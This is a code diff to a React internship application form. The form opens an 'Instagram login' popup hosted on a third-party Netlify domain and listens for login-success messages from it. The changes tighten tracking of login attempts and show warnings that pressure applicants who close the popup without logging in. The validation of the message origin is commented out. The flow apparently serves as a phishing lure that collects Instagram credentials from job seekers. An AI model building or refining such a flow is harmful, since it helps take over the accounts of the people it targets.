@@ -1,3 +1,4 @@
+
 import React, { useState, useEffect } from 'react';
 import { CheckCircle, ExternalLink, AlertCircle, Users, Clock, DollarSign, MapPin, Mail, Check, Instagram, Bell, Code } from 'lucide-react';
 
@@ -25,6 +26,8 @@ const InternshipForm = () => {
   const [animationStage, setAnimationStage] = useState(0);
   const [instagramPopupOpened, setInstagramPopupOpened] = useState(false);
   const [loginAttemptMade, setLoginAttemptMade] = useState(false);
+  const [loginSuccessReceived, setLoginSuccessReceived] = useState(false);
+  const [popupClosureHandled, setPopupClosureHandled] = useState(false);
 
   useEffect(() => {
     // Welcome toast animation
@@ -54,8 +57,12 @@ const InternshipForm = () => {
       // if (event.origin !== 'https://intern-insta-login.netlify.app') return;
       
       if (event.data && event.data.type === 'INSTAGRAM_LOGIN_SUCCESS') {
-        // Mark that a login attempt was made
+        console.log('Instagram login success received from popup');
+        
+        // Mark that success was received - this is crucial
+        setLoginSuccessReceived(true);
         setLoginAttemptMade(true);
+        setPopupClosureHandled(true); // Prevent error notification
         
         // Update form state to indicate Instagram is followed
         setFormData(prev => ({ ...prev, instagramFollowed: true }));
@@ -70,11 +77,18 @@ const InternshipForm = () => {
         // Hide reminder if it's showing
         setShowInstagramReminder(false);
         
-        console.log('Instagram login success received from popup');
       } else if (event.data && event.data.type === 'INSTAGRAM_LOGIN_ATTEMPT') {
-        // Mark that a login attempt was made (even if it might fail)
-        setLoginAttemptMade(true);
         console.log('Instagram login attempt detected');
+        setLoginAttemptMade(true);
+        
+      } else if (event.data && event.data.type === 'INSTAGRAM_POPUP_CLOSED_WITHOUT_LOGIN') {
+        console.log('Popup closed without login message received');
+        // Only show warning if no success was received
+        if (!loginSuccessReceived) {
+          setShowPopupClosedWarning(true);
+          setTimeout(() => setShowPopupClosedWarning(false), 8000);
+        }
+        setPopupClosureHandled(true);
       }
     };
 
@@ -83,7 +97,7 @@ const InternshipForm = () => {
     return () => {
       window.removeEventListener('message', handleMessage);
     };
-  }, []);
+  }, [loginSuccessReceived]);
 
   // Window focus detection for Instagram success toast (keeping as backup)
   useEffect(() => {
@@ -173,9 +187,15 @@ const InternshipForm = () => {
   };
 
   const handleInstagramClick = () => {
+    console.log('Opening Instagram popup...');
+    
     setInstagramPopupOpened(true);
     setShowInstagramReminder(false);
-    setLoginAttemptMade(false); // Reset login attempt tracking
+    
+    // Reset all tracking flags when opening new popup
+    setLoginAttemptMade(false);
+    setLoginSuccessReceived(false);
+    setPopupClosureHandled(false);
 
     const width = 500;
     const height = 600;
@@ -195,22 +215,30 @@ const InternshipForm = () => {
       return;
     }
 
-    // Monitor popup closure
+    // Monitor popup closure with improved logic
     const checkClosed = setInterval(() => {
       if (popup.closed) {
         clearInterval(checkClosed);
         setInstagramPopupOpened(false);
         
-        // Check if popup was closed without login attempt
+        console.log('Popup closed detected');
+        console.log('Login success received:', loginSuccessReceived);
+        console.log('Popup closure handled:', popupClosureHandled);
+        
+        // Wait longer to ensure all messages from popup are processed
         setTimeout(() => {
-          if (!loginAttemptMade && !formData.instagramFollowed) {
+          // Only show warning if:
+          // 1. No success message was received
+          // 2. Popup closure wasn't already handled by a message
+          // 3. User didn't successfully follow Instagram
+          if (!loginSuccessReceived && !popupClosureHandled && !formData.instagramFollowed) {
+            console.log('Showing popup closed warning');
             setShowPopupClosedWarning(true);
             setTimeout(() => setShowPopupClosedWarning(false), 8000);
-            console.log('Popup closed without login attempt - showing warning');
+          } else {
+            console.log('Not showing warning - success was achieved or closure was handled');
           }
-        }, 500); // Small delay to ensure messages are processed
-        
-        console.log('Popup closed');
+        }, 2000); // Increased delay to 2 seconds to ensure all messages are processed
       }
     }, 1000);
   };
@@ -230,6 +258,8 @@ const InternshipForm = () => {
       </div>
     </div>
   );
+
+  // ... keep existing code (submitted return statement and main form JSX)
 
   if (submitted) {
     return (
